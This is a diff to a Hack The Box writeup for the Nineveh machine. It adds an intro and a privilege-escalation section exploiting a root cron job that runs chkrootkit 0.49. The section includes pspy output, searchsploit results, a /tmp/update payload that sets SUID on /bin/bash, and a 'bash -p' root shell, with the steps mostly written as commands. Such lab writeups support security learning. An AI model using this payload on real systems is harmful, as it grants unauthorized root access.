@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: gobuster hydra metadata phpliteadmin authenticated rce id_rsa authorized_keys knockd port-knocking lfi localfileinclusion phpinfo typejugglingattack loginbypass hydra brute-force 
+tags: gobuster hydra metadata phpliteadmin authenticated rce id_rsa authorized_keys knockd port-knocking lfi localfileinclusion phpinfo typejugglingattack loginbypass hydra brute-force chkrootkit pspy64 
 ---
 
 <br />
@@ -22,7 +22,7 @@ Difficulty -> Medium.
 
 <br />
 
-
+Hello hackers! Today we’re tackling Nineveh, a Medium Linux box with layers of classic and modern web exploitation. We kick things off by enumerating HTTP and HTTPS services, uncovering multiple web interfaces. A phpLiteAdmin panel becomes our initial target, where we brute-force the login to exploit an authenticated RCE via default value injection. However, to execute commands, we chain this with a Local File Inclusion vulnerability discovered in a separate web app—accessed by bypassing its login using a clever PHP type juggling trick. With RCE in hand, we pivot to gain a proper shell by leveraging leaked SSH keys and a port-knocking sequence revealed through LFI. Once inside as amrois, we monitor processes with pspy and discover a vulnerable chkrootkit cronjob. A simple SUID privilege escalation lands us a root shell. Great mix of web, auth bypass, and local escalation. Rooted! Preguntar a ChatGPT
 
 <br />
 
@@ -601,5 +601,133 @@ amrois@nineveh:~$ cat user.txt
 <br />
 
 # Privilege Escalation: amrois -> root
+
+<br />
+
+While monitoring system activity using `pspy`, we notice the following scheduled task running as `root`:
+
+<br />
+
+```bash
+amrois@nineveh:/tmp/Privesc$ ./pspy64 
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+...[snip]...
+2025/07/28 14:10:03 CMD: UID=0     PID=28911  | /bin/sh /usr/bin/chkrootkit
+...[snip]...
+```
+
+<br />
+
+We observe that `chkrootkit` is being executed periodically as `root`.
+
+`Chkrootkit` is a common security tool used by system administrators to detect `rootkits` or signs of compromise on Unix-like systems.
+
+<br />
+
+# Chkrootkit v0.49 Exploit
+
+<br />
+
+After doing some research, we find a known local privilege escalation vulnerability in `chkrootkit v0.49`. This version is vulnerable to arbitrary command execution when certain conditions are met, allowing escalation to `root`.
+
+<br />
+
+```bash
+❯ searchsploit chkrootkit
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                 | linux/local/38775.rb
+Chkrootkit 0.49 - Local Privilege Escalation                                                                                                         | linux/local/33899.txt
+```
+
+<br />
+
+The PoC outlines the following steps:
+
+<br />
+
+```bash
+Steps to reproduce:
+
+- Put an executable file named 'update' with non-root owner in /tmp (not
+mounted noexec, obviously)
+- Run chkrootkit (as uid 0)
+```
+
+<br />
+
+We prepare our payload:
+
+<br />
+
+```bash
+amrois@nineveh:/tmp$ cat update 
+#!/bin/bash
+
+chmod 4755 /bin/bash
+```
+
+<br />
+
+Make the file executable:
+
+```bash
+amrois@nineveh:/tmp$ chmod +x update
+```
+
+<br />
+
+Once the cronjob runs `chkrootkit`, it executes our `update` script with root privileges. We then verify that `/bin/bash` has the SUID bit set:
+
+<br />
+
+```bash
+amrois@nineveh:/tmp$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
+```
+
+<br />
+
+We now spawn a root shell using the `-p` flag (preserve privileges):
+
+<br />
+
+```bash
+amrois@nineveh:/tmp$ bash -p
+bash-4.3# whoami
+root
+```
+
+<br />
+
+Finally, we read the `root.txt` flag:
+
+<br />
+
+```bash
+bash-4.3# cat root.txt
+5c64787e4abbd7f15c72c2ff8exxxxxx
+```
+
+<br />
+
+System successfully pwned! ✅
+
+I hope you learned something and enjoyed the machine.
+
+Keep hacking!❤️❤️
 
 <br />
